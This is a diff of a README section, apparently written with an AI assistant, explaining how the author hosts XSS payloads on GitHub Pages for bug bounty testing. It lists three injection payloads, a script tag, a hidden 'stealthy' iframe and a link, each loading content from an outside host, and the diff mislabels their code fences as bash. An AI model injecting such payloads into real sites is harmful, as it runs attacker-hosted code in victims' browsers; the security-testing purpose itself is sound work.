@@ -15,7 +15,7 @@ Absolutely! Here's a clean, well-formatted `README.md` section for **"How to Use
 
 ---
 
-```markdown
+
 ## 🚀 How I Use It
 
 Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting.
@@ -27,19 +27,19 @@ When I find a vulnerable parameter or input field that allows HTML/JS injection,
 
 ### 📜 Basic Script Injection
 
-```html
+```bash
 <script src="https://yogsec.github.io/xss-test/"></script>
 ```
 
 ### 🕵️‍♂️ Stealthy iframe Injection
 
-```html
+```bash
 <iframe src="https://yogsec.github.io/xss-test/" style="display:none"></iframe>
 ```
 
 ### 🔗 Clickable Link Payload
 
-```html
+```bash
 <a href="https://yogsec.github.io/xss-test/">Click Here</a>
 ```
 
